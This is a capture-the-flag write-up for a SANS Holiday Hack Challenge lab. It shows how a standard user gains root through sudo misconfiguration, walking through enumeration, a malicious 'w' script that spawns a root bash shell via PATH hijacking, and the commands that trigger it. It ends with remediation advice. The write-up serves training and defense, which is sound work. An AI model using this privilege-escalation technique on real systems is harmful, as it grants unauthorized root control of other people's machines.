# Neighborhood Watch Bypass

**Difficulty:** ⭐⭐

---

## Challenge Overview

Assist Kyle at the old data center with a fire alarm system that has been locked out. The neighborhood's fire protection infrastructure is at risk, and admin privileges have been mysteriously revoked.

### Kyle Parrish

Kyle is a longtime Holiday Hack Challenge participant (known as "arnydo") with multiple Super Honorable Mentions. When he's not fighting fires or hunting vulnerabilities, you'll find him on a unicycle, juggling, or exploring the East Tennessee mountains with his family. He brings his geocaching skills to cybersecurity - finding hidden things is useful in both!

> **Challenge Quote:** "This fire alarm keeps going nuts but there's no fire. I checked. I think someone has locked us out of the system. Can you see if you can get back in?"

## Objective

Gain root/admin privileges to run `/etc/firealarm/restore_fire_alarm` and restore the fire alarm system control.

**Starting Position:** Standard user account `chiuser` with limited privileges.

---

## The Challenge Interface

![Fire Alarm System Lockout](../images/act1/neighborhood-watch/1000000100000397000001D9142162DB.png)

*The fire alarm system has been locked down to standard user access only*

### System Status

```
🚨 EMERGENCY ALERT: Fire alarm system admin access has been compromised!

⚠️  CURRENT STATUS: Limited to standard user access only
🔒 FIRE SAFETY SYSTEMS: Partially operational but restricted  
🎯 MISSION CRITICAL: Restore full fire alarm system control

Your mission: Find a way to bypass the current restrictions and elevate
to fire safety admin privileges. Once you regain full access, run:
/etc/firealarm/restore_fire_alarm
```

---

## Solution Walkthrough

### Phase 1: System Enumeration

The first step in any privilege escalation scenario is understanding your current context and identifying potential attack vectors.

#### Step 1: Identify Current User Context

```bash
whoami
pwd
id
groups
```

**Results:**

```
whoami: chiuser
pwd: /home/chiuser
uid=1000(chiuser) gid=1000(chiuser) groups=1000(chiuser)
groups: chiuser
```

**Analysis:**
- We are user `chiuser` (UID 1000)
- Standard user with no special group memberships
- No obvious privilege indicators from groups alone

#### Step 2: Check Sudo Privileges (CRITICAL)

```bash
sudo -l
```

**Results:**

```
Matching Defaults entries for chiuser on 93502c25c54f:
    env_reset, mail_badpass,
    secure_path=/home/chiuser/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    env_keep+="API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME",
    env_keep+=PATH

User chiuser may run the following commands on 93502c25c54f:
    (root) NOPASSWD: /usr/local/bin/system_status.sh
```

**🚨 CRITICAL FINDINGS:**

1. **Sudo Access Without Password:**
   - Can run `/usr/local/bin/system_status.sh` as root with `NOPASSWD`
   - No authentication required!

2. **PATH Preservation (env_keep+=PATH):**
   - The `PATH` environment variable is **preserved** when running sudo
   - This is a **major security misconfiguration**
   - Normally, sudo resets PATH for security

3. **Secure Path Configuration:**
   - `secure_path=/home/chiuser/bin:/usr/local/sbin:...`
   - Notice `/home/chiuser/bin` is **first** in the secure path
   - Any commands in `/home/chiuser/bin/` will be executed **before** system commands

4. **Attack Surface Identified:**
   - If `system_status.sh` calls commands without absolute paths
   - We can create malicious executables in `/home/chiuser/bin/`
   - When the script runs as root, it will execute our malicious versions!

#### Step 3: Search for SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Results:**

```
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/chfn
/usr/bin/mount
/usr/bin/chsh
/usr/bin/su
/usr/bin/sudo
```

**Analysis:**
- All standard system utilities
- No unusual or exploitable SUID binaries
- This is NOT our attack vector

#### Step 4: Attempt to Access Target Directory

```bash
ls -la /etc/firealarm/
```

**Result:**

```
ls: cannot open directory '/etc/firealarm/': Permission denied
```

**Confirmation:** We need root privileges to complete the mission.

---

### Phase 2: Vulnerability Analysis

#### Examining the Sudo-Enabled Script

```bash
cat /usr/local/bin/system_status.sh
```

**Script Contents:**

```bash
#!/bin/bash

echo "=== Dosis Neighborhood Fire Alarm System Status ==="
echo "Fire alarm system monitoring active..."
echo ""

echo "System resources (for alarm monitoring):" 
free -h

echo -e "\nDisk usage (alarm logs and recordings):"
df -h

echo -e "\nActive fire department connections:"
w  # ← TARGET: Called without absolute path!

echo -e "\nFire alarm monitoring processes:"
ps aux | grep -E "(alarm|fire|monitor|safety)" | head -5

echo ""
echo "🔥 Fire Safety Status: All systems operational"
```

#### Vulnerable Commands Identified

Commands called **without absolute paths:**

| Command | Path Required | Hijackable |
|---------|--------------|------------|
| `echo` | `/bin/echo` | ✅ Yes |
| `free` | `/usr/bin/free` | ✅ Yes |
| `df` | `/bin/df` | ✅ Yes |
| **`w`** | `/usr/bin/w` | ✅ **CHOSEN TARGET** |
| `ps` | `/bin/ps` | ✅ Yes |
| `grep` | `/bin/grep` | ✅ Yes |
| `head` | `/usr/bin/head` | ✅ Yes |

**Why we chose `w`:**
- Simple, single-letter command
- Isolated call (not in a pipeline initially)
- Easy to hijack without breaking script flow

#### The Attack Vector: PATH Hijacking

**How the exploit works:**

```
1. Script runs as root via sudo
2. PATH is preserved (env_keep+=PATH)
3. /home/chiuser/bin is FIRST in the path
4. Script calls 'w' without absolute path
5. Linux searches PATH directories LEFT TO RIGHT
6. Our malicious /home/chiuser/bin/w executes BEFORE real /usr/bin/w
7. ROOT SHELL OBTAINED!
```

---

### Phase 3: Exploitation

#### Step 1: Create User Bin Directory

```bash
mkdir -p /home/chiuser/bin
```

#### Step 2: Create Malicious `w` Command

```bash
cat > /home/chiuser/bin/w << 'EOF'
#!/bin/bash
/bin/bash
EOF
```

**What this does:**
- Creates a fake `w` command
- Instead of showing logged-in users, spawns a bash shell
- When run as root, spawns a **root shell**

#### Step 3: Make Executable

```bash
chmod +x /home/chiuser/bin/w
```

#### Step 4: Verify PATH Setup

```bash
echo $PATH
# Output: /home/chiuser/bin:/usr/local/sbin:/usr/local/bin:...
#         ^^^^^^^^^^^^^^^^^^^^ OUR DIRECTORY IS FIRST!

which w
# Output: /home/chiuser/bin/w ← Our malicious version!
```

#### Step 5: Trigger the Exploit

```bash
sudo /usr/local/bin/system_status.sh
```

**Execution Flow:**

```
1. Script runs as root
2. Executes echo commands (prints system info)
3. Executes free -h (shows memory)
4. Executes df -h (shows disk usage)
5. Executes w ← HIJACKED!
   - Instead of /usr/bin/w
   - Runs /home/chiuser/bin/w
   - Our script executes /bin/bash as root
6. ROOT SHELL OBTAINED!
```

**Prompt Changed:**

```
Before: 🏠 chiuser @ Dosis Neighborhood ~ 🔍 $
After:  root@93502c25c54f:/home/chiuser#
```

![Root Shell Obtained](../images/act1/neighborhood-watch/10000001000005A30000030A2E25BAA0.png)

*Successfully gained root access through PATH hijacking!*

---

### Phase 4: Mission Complete

#### Restore Fire Alarm System

```bash
/etc/firealarm/restore_fire_alarm
```

**Output:**

```
🔥🚨 FIRE ALARM SYSTEM: Attempting to restore admin privileges...
    BYPASSING SECURITY RESTRICTIONS...
    Connecting to fire safety control center...
    SUCCESS! Fire alarm system admin access RESTORED!
    DOSIS NEIGHBORHOOD FIRE PROTECTION: FULLY OPERATIONAL

✅ All fire safety systems are now under proper administrative control
```

![Challenge Complete](../images/act1/neighborhood-watch/10000001000002B4000000CBB5CB8EC5.png)

*Fire alarm system successfully restored!*

---

## Technical Concepts Learned

### 1. Sudo Privilege Enumeration

**`sudo -l`** is the **first command** to run in any Linux privilege escalation scenario.

**What it reveals:**
- Which commands can be run as root
- Sudo configuration settings
- Environment variable handling
- Authentication requirements (NOPASSWD, etc.)

**Example Output Analysis:**

```bash
(root) NOPASSWD: /usr/local/bin/system_status.sh
```

This tells us:
- Command can be run as `root`
- `NOPASSWD` means no password required
- Only this specific script is allowed

### 2. PATH Hijacking Attack

**How Linux finds executables:**

When you type a command like `w`, Linux searches for the executable in directories listed in the `$PATH` environment variable, **from left to right**.

```bash
PATH=/home/chiuser/bin:/usr/bin:/bin
```

**Search order:**
1. `/home/chiuser/bin/w` ← Checks here FIRST
2. `/usr/bin/w` ← Then here
3. `/bin/w` ← Finally here

**Relative vs Absolute Paths:**

| Type | Example | Behavior |
|------|---------|----------|
| **Relative** | `w` | Searches $PATH |
| **Absolute** | `/usr/bin/w` | Executes that specific file |

**The Exploit:**

Place a malicious executable in a PATH directory that's searched **before** the legitimate one.

### 3. Environment Variable Preservation

**Normal sudo behavior:**
```bash
sudo command  # PATH is reset to secure_path
```

**With env_keep+=PATH:**
```bash
sudo command  # PATH is PRESERVED from user environment
```

**Why this is dangerous:**
- Allows attacker to control which executables are found
- Violates principle of least privilege
- Enables PATH hijacking attacks

### 4. SUID Binaries

**SUID (Set User ID)** is a special permission that allows programs to run with their owner's privileges.

**Finding SUID binaries:**

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Permissions display:**

```
-rwsr-xr-x  # The 's' indicates SUID is set
```

**Note:** Not used in this challenge, but a common privilege escalation vector.

---

## The Security Misconfiguration

### What Went Wrong

| Issue | Security Impact | Severity |
|-------|----------------|----------|
| ✅ Sudo access to script | Necessary for admin tasks | Low |
| ❌ **NOPASSWD** | Convenience over security | Medium |
| ❌ **env_keep+=PATH** | Allows PATH manipulation | **CRITICAL** |
| ❌ User dir in secure_path | `/home/chiuser/bin` shouldn't be there | **CRITICAL** |
| ❌ Relative command paths | Script should use absolute paths | High |

### How to Fix

1. **Remove env_keep+=PATH from sudo configuration**
   ```bash
   # /etc/sudoers
   # DELETE THIS LINE:
   Defaults env_keep+=PATH
   ```

2. **Remove user directories from secure_path**
   ```bash
   # BEFORE:
   secure_path=/home/chiuser/bin:/usr/local/sbin:...
   
   # AFTER:
   secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
   ```

3. **Use absolute paths in sudo-enabled scripts**
   ```bash
   # BEFORE:
   w
   
   # AFTER:
   /usr/bin/w
   ```

4. **Implement principle of least privilege**
   - Only allow specific, hardened scripts
   - Require password authentication
   - Log all sudo usage
   - Regular security audits

---

## Attack Summary

| Phase | Action | Result |
|-------|--------|--------|
| **Reconnaissance** | `sudo -l` | Found exploitable sudo privilege |
| **Analysis** | Read script | Identified PATH hijacking opportunity |
| **Weaponization** | Created malicious `w` | Prepared privilege escalation payload |
| **Exploitation** | `sudo system_status.sh` | Gained root shell |
| **Objective** | `/etc/firealarm/restore_fire_alarm` | Mission complete ✅ |

---

## Real-World Impact

### Common Misconfiguration

This vulnerability pattern appears frequently in production systems:

**Why it happens:**
- Administrators prioritize convenience over security
- `NOPASSWD` removes authentication friction
- User directories in PATH enable "custom tools"
- Relative paths seem cleaner in scripts

**Real-world examples:**
- DevOps automation scripts
- System monitoring tools
- Backup scripts
- Application deployment systems

### Security Best Practices

1. **Never preserve PATH in sudo**
   - Always let sudo reset the environment
   - Use `secure_path` with only trusted directories

2. **Always use absolute paths in privileged scripts**
   - `/usr/bin/command` not `command`
   - Prevents PATH-based attacks

3. **Minimize NOPASSWD usage**
   - Require authentication when possible
   - Use time-limited sudo sessions

4. **Regular security audits**
   - Review `/etc/sudoers` configuration
   - Check for user directories in secure_path
   - Audit privileged scripts for relative paths

---

## Key Takeaways

1. ✅ **`sudo -l` is your first enumeration step** - Always check what commands can be run as root
2. ✅ **env_keep+=PATH is extremely dangerous** - Never preserve PATH in sudo configurations
3. ✅ **Absolute paths prevent hijacking** - Scripts should use `/usr/bin/cmd` not `cmd`
4. ✅ **PATH order matters** - First directory in PATH wins the race
5. ✅ **Defense in depth** - Multiple misconfigurations combined to create this vulnerability

---

## Challenge Complete!

**Status:** ✅ Completed  
**Vulnerability Exploited:** PATH Hijacking via Sudo with Preserved Environment Variables  
**Technique:** Malicious command injection in prioritized PATH directory  
**Result:** Root access obtained, fire alarm system restored

### Kyle Parrish's Response

> *"Wow! Thank you so much! I didn't realize sudo was so powerful. Especially when misconfigured. Who knew a simple privilege escalation could unlock the whole fire safety system? Now... will you sudo make me a sandwich?"*

---

**SANS Holiday Hack Challenge 2025**  
*Act 1: Neighborhood Watch Bypass*

---

*Challenge writeup by SFC David P. Collette*  
*Regional Cyber Center - Korea (RCC-K)*  
*SANS Holiday Hack Challenge 2025*
